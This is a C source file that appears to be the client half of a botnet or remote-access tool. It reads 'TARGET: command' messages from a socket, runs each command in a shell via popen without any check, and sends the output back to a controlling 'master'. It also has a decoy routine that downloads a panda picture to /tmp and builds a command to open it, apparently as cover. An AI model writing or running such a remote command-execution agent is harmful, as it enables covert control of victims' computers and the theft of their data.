#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <curl/curl.h>
#include "utils.h"
#include "macros.h"

int respond(int s, char *msg_buf) {
    // Write the contents of msg_buf into socket s and return status
    return write(s, msg_buf, strlen(msg_buf));
}

int receive(int s, char *msg) {
    // Reset the msg buffer
    memset(msg, 0, CMD_LENGTH);
    
    // Read contents of socket s into msg
    int read_status = read(s, msg, CMD_LENGTH);
    
    if (read_status < 0) {
        perror("read:");
        exit(1);
    }
    
    return 0;
}

int parse(int s, char *msg, char* name) {
    char *target = msg;

    // Check whether the msg was targeted for this client
    if (strncmp(target, name, strlen(name)) != 0) {
        return 0;  // Silently drop the packet
    }

    char *cmd = strchr(msg, ':');
    if (cmd == NULL) {
        printf("Incorrect formatting. Reference: TARGET: command");
        return -1;
    }

    // Adjust the cmd pointer to the start of the actual command
    cmd++;
    
    // Print a local statement detailing what command was received
    printf("Executing command: %s\n", cmd);

    execute(s, cmd);
    return 0;
}

int execute(int s, char *cmd) {
    char buffer[CMD_LENGTH];
    
    // Use popen to run the command locally
    FILE *f = popen(cmd, "r");
    
    if (!f) return -1;
    
    while (!feof(f)) {
        // Parse through f line by line and send any output back to master
        if (fgets(buffer, CMD_LENGTH, f) != NULL) {
            respond(s, buffer);
        }
    }
    
    fclose(f);
    return 0;
}

char* alias_img(void) {
    CURL *curl;
    FILE *fp;
    CURLcode res;
    char* url = "https://upload.wikimedia.org/wikipedia/commons/thumb/e/e9/Giant_Panda_in_Beijing_Zoo_1.jpg/800px-Giant_Panda_in_Beijing_Zoo_1.jpg";
    char outfilename[FILENAME_MAX] = "/tmp/panda.jpg";
    
    curl = curl_easy_init();
    if (curl) {
        fp = fopen(outfilename, "wb");
        curl_easy_setopt(curl, CURLOPT_URL, url);
        curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, NULL);
        curl_easy_setopt(curl, CURLOPT_WRITEDATA, fp);
        res = curl_easy_perform(curl);
        curl_easy_cleanup(curl);
        fclose(fp);
    }
    
    char* open_cmd = malloc(strlen("open ") + strlen(outfilename) + 1);
    strcpy(open_cmd, "open ");
    strcat(open_cmd, outfilename);
    
    return open_cmd;
}
